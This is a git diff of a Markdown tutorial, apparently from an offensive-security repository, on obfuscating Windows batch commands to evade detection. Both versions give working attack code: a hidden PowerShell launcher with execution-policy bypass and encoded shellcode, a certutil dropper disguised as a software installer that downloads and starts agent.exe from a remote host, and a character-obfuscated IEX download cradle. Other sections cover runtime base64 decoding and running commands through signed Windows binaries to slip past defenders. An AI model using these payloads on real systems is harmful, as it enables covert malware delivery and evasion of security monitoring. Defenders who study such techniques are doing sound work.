@@ -282,156 +282,168 @@ set !h=n
 ![tres](https://user-images.githubusercontent.com/23490060/95486006-63d56b80-098a-11eb-94b1-a7ea0d6ca7f1.png)
 
 ---
-
-      This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract
-      the strings inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]
-
+	
 <br />
 
-- String command to obfuscate<br />
-`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
+This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract<br />
+the strings inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]
 
-- String obfuscated (**template.bat**)<br />
-
-      @echo off
-      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
-      %varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
-      exit
-
-![batch obfuscation](http://i67.tinypic.com/2zdu9z7.jpg)
-
+<br />
+	
+String command to obfuscate<br />
+```cmd
+cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+```
+	
+String obfuscated (**template.bat**)<br />
+```cmd
+@echo off
+SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
+%varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
+exit
+```
+	
+![rr3](https://user-images.githubusercontent.com/23490060/120903255-068ada80-c63d-11eb-8c65-fa91148135b0.png)<br />
+	
 [!] [Description of %varObj% MasterKey (importante reading to understand the mechanism)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md)<br />
 
 ---
+	
+<br />	
 
-      [ certutil - Additional Methods for Remote Download ]
-      Sometimes we need to use non-conventional methods to deliver our agent to target
-      system and bypass detection, in this situation certutil can be an useful asset.
+<b><i>[ certutil - Additional Methods for Remote Download ]</i></b><br />
+Sometimes we need to use non-conventional methods to deliver our agent to target<br />
+system and bypass detection, in this situation certutil can be an useful asset.
 
 <br />
+	
+String command to obfuscate<br />
+```cmd
+cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.71/agent.exe agent.exe && start agent.exe
+```
+	
+File **certutil-dropper.bat** to be executed in target system<br />
+```cmd
+@echo off
+sEt !h=e
+sEt db=c
+sEt 0x=a
+echo [+] Please Wait, Installing software ..
+;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%A1%tIl.%!h%^xe "-"u^R%A0%l%db%Ac^h%!h% "-"sP%A0%l^i%A8%T -f ht%A0%tp://19%d0%2.1%A0%68.1.71/agent.exe agent.exe && start agent.exe
+exit
+```
 
-- String command to obfuscate<br />
-`cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.71/agent.exe agent.exe && start agent.exe`<br />
-
-- File **certutil-dropper.bat** to be executed in target system
-
-      @echo off
-      sEt !h=e
-      sEt db=c
-      sEt 0x=a
-      echo [+] Please Wait, Installing software ..
-      ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%A1%tIl.%!h%^xe "-"u^R%A0%l%db%Ac^h%!h% "-"sP%A0%l^i%A8%T -f ht%A0%tp://19%d0%2.1%A0%68.1.71/agent.exe agent.exe && start agent.exe
-      exit
-
-![batch obfuscation certutil.bat](http://i68.tinypic.com/jsfuq1.jpg)
 `HINT: If you desire to send an .bat payload then delete 'start' from the sourcecode`<br />
 
 ---
+	
+<br />
 
-      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
-      the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.
+<b><i>Using base64 stings decoded at runtime are a Useful obfuscation trick.</i></b><br />
+Because the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.
 
-      HINT: Since windows dosen't have a base64 term interpreter built in installed,
-      we have two choises to decode the base64 encoded syscall, or use the built in
-      powershell (::FromBase64String) switch to decode our syscall or we chose to use
-      certutil, but certuil onlly accepts strings taken from inside a text file, in
-      that situation we instruct our script to writte the text files containing the
-      obfuscated syscall's before further head using certutil to decode them.
-
-      REMARK: If the local var can't be accessed from cmd, setX syscall=R2V0LURhdGUK
+HINT: Since windows dosen't have a base64 term interpreter built in installed, we have two choises to decode the base64 encoded syscall, or use the built in powershell (::FromBase64String) switch to decode our syscall or we chose to use certutil, but certuil onlly accepts strings taken from inside a text file, in that situation we instruct our script to writte the text files containing the obfuscated syscall's before further head using certutil to decode them.
 
 <br />
 
-- String command to obfuscate<br />
-`Get-Date`
+String command to obfuscate<br />
+```cmd
+Get-Date
+```
 
-- using base64 to decode the encoded syscall
+using base64 to decode the encoded syscall<br />
+```cmd
+1º - encode the command you want to obfuscate (linux-terminal)
+echo "Get-Date" | base64
 
-      1º - encode the command you want to obfuscate (linux-terminal)
-      echo "Get-Date" | base64
+2º - copy the encoded string to paste it on your script
+R2V0LURhdGUK
 
-      2º - copy the encoded string to paste it on your script
-      R2V0LURhdGUK
+3º - Insert the follow lines into your batch script
+@echo off
+set syscall=R2V0LURhdGUK :: <-- WARNING: Dont leave any 'empty spaces' in variable creation
+powershell.exe $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:syscall)); powershell.exe $decoded ::<-- execute/decode the base64 syscall at runtime
+```
 
-      3º - Insert the follow lines into your batch script
+---
+	
+<br />
 
-        @echo off
-        set syscall=R2V0LURhdGUK :: <-- WARNING: Dont leave any 'empty spaces' in variable creation
-        powershell.exe $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:syscall)); powershell.exe $decoded ::<-- execute/decode the base64 syscall at runtime
+More obscure obfuscated/bypass technics<br />
 
-![batch obfuscation](http://i66.tinypic.com/qzfbex.jpg)
+<b><i>[ cmd similar interpreter's ]</i></b> defenders watching launches of cmd instance?<br />
+then use the follow Microsoft signed binarys to execute your agents.
+	
+<br />
+	
+```cmd
+bash.exe -C calc.exe
+scriptrunner.exe -appvscript calc.exe
+forfiles /p c:\windows\system32\ /m notepad.exe /c calc.exe
+```
+
+![rr4](https://user-images.githubusercontent.com/23490060/120903329-80bb5f00-c63d-11eb-8824-603f0c388417.png)
 
 ---
 
-- More obscure obfuscated/bypass technics<br />
+<br />
 
-      [ cmd similar interpreter's ] defenders watching launches of cmd instance?
-      then use the follow Microsoft signed binarys to execute your agents
+<b><i>[ delimiter removal in cmd interpreter :@= ]</i></b><br />
+we can use [ `@` ] special char to obfuscate the syscall and then remove it at execution time..<br />
 
-      bash.exe -C calc.exe
-      scriptrunner.exe -appvscript calc.exe
-      forfiles /p c:\windows\system32\ /m notepad.exe /c calc.exe
-
-![batch obfuscation](http://i.cubeupload.com/i60JVh.jpg)
+The attacker sets the netstat command in a process-level environment variable called x before passing it to the final cmd.exe as standard input. The attacker also obfuscates the string netstat in the original cmd.exe command using `@` characters. The `@` characters are later removed from the command contents stored in the environment variable x using cmd.exe’s native variable string replacement functionality. `%VariableName:StringToFind=NewString%` where `StringToFind` is the `@` character and `NewString` is blank, so the `@` character is simply removed.
 
 <br />
 
-      [ delimiter removal in cmd interpreter :@= ] 
-      we can use [ @ ] special char to obfuscate the syscall and then remove it at execution time..
-
-      The attacker sets the netstat command in a process-level environment variable called x before
-      passing it to the final cmd.exe as standard input. The attacker also obfuscates the string netstat
-      in the original cmd.exe command using @ characters. The @ characters are later removed from the
-      command contents stored in the environment variable x using cmd.exe’s native variable string
-      replacement functionality. %VariableName:StringToFind=NewString% where StringToFind is the @
-      character and NewString is blank, so the @ character is simply removed.
-
+String command to obfuscate<br />
+```cmd
+cmd.exe /c netstat
+```
+	
+String obfuscated<br />
+```cmd
+cmd.exe /c "set x=net@st@at&&echo %x:@=% | cmd"
+```
+	
+![rr5](https://user-images.githubusercontent.com/23490060/120903564-bc0a5d80-c63e-11eb-9e6b-f38562994e18.png)
+	
 <br />
 
-- String command to obfuscate<br />
-`cmd.exe /c netstat`
+This technic can also be used to replace the [ `@` ] special character in local environment<br />
+variable by the char missing on it ( in this example the char missing in command is: [ `t` ] )
+	
+<br />
 
-- String obfuscated<br />
-`cmd.exe /c "set x=net@st@at&&echo %x:@=% | cmd"`
+String obfuscated<br />
+```cmd
+cmd.exe /c "set x=ne@s@a@&&echo %x:@=t% | cmd"
+```
+	
+Remove the first and the last character of a string<br />
+```cmd
+cmd.exe /c "set x=inetstatu&&set str=%x:~1,-1%&&echo %str% | cmd"
+```
 
-![pipe commands](http://i.cubeupload.com/FE0TA8.jpg)
+Returning a specified number of characters from the left side of a string<br />
+```cmd
+cmd.exe /c "set x=netstatrubish&&set str=%x:~0,7%&&echo %str% | cmd"
+```
 
-      This technic can also be used to replace the [ @ ] special character in local environment
-      variable by the char missing on it ( in this example the char missing in command is: [ t ] )
+<br />
+	
+Using the delimiter remove technic into one cradle downloader (powershell or batch)<br />
+	
+<br />	
 
-- String obfuscated<br />
-`cmd.exe /c "set x=ne@s@a@&&echo %x:@=t% | cmd"`
-
-![pipe commands](http://i.cubeupload.com/8ySlqV.jpg)
-
-      Remove the first and the last character of a string
-
-- String obfuscated<br />
-``cmd.exe /c "set x=inetstatu&&set str=%x:~1,-1%&&echo %str% | cmd"``
-
-![pipe commands](http://i.cubeupload.com/y1kA6G.jpg)
-
-      Returning a specified number of characters from the left side of a string
-
-- String obfuscated<br />
-`cmd.exe /c "set x=netstatrubish&&set str=%x:~0,7%&&echo %str% | cmd"`
-
-![pipe commands](http://i.cubeupload.com/McTrjq.jpg)
-
-      Using the delimiter remove technic into one cradle downloader (powershell or batch)
-
-- String command to obfuscate<br />
-`cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`
-
-- String obfuscated<br />
-
-      cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do@wnl@oad@St@ri@ng('ht'+'@tp:'+'//@1'+'92@.1'+'6@8.'+'1.71/he@ll@o.ps@1')&&echo %x:@=% | cmd"
-
-![pipe commands](http://i.cubeupload.com/tv0oWc.jpg)
-
-- More obfuscated using carets special batch characters<br />
-
-![pipe commands](http://i.cubeupload.com/EhLChy.jpg)
+String command to obfuscate<br />
+```cmd	
+cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')
+```
+	
+String obfuscated<br />
+```cmd
+cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do@wnl@oad@St@ri@ng('ht'+'@tp:'+'//@1'+'92@.1'+'6@8.'+'1.71/he@ll@o.ps@1')&&echo %x:@=% | cmd"
+```
 
 ---
 
